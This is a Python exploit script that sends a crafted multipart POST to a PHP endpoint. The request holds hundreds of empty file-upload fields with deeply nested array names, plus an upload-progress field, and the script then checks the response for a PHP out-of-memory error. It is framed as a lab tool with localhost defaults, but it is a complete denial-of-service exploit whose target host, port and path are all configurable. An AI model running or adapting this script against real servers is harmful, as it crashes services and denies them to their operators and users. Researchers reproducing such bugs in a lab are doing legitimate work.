#!/usr/bin/env python3
"""Fire the nested empty-upload OOM against a lab endpoint."""
import argparse, uuid, requests

ap = argparse.ArgumentParser()
ap.add_argument("--host", default="127.0.0.1")
ap.add_argument("--port", type=int, default=8095)
ap.add_argument("--path", default="/index.php")
ap.add_argument("--sid", default="dbgsess01")
ap.add_argument("--parts", type=int, default=600)
ap.add_argument("--depth", type=int, default=45)
a = ap.parse_args()

b = "----a" + uuid.uuid4().hex
out = [("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
        "\r\n\r\np\r\n" % b).encode()]
for i in range(a.parts):
    name = "files[%d]" % i + "".join("[k%d]" % j for j in range(a.depth))
    out.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"\""
                "\r\n\r\n" % (b, name)).encode())
out.append(("--%s--\r\n" % b).encode())
payload = b"".join(out)

def gen():
    for i in range(0, len(payload), 8192):
        yield payload[i:i + 8192]

try:
    r = requests.post("http://%s:%d%s" % (a.host, a.port, a.path), data=gen(),
                      cookies={"PHPSESSID": a.sid},
                      headers={"Content-Type": "multipart/form-data; boundary=" + b},
                      timeout=90)
    print("[*] status=%s oom=%s" % (r.status_code, "Allowed memory" in r.text))
except Exception as e:
    print("[*] transport: %s" % type(e).__name__)
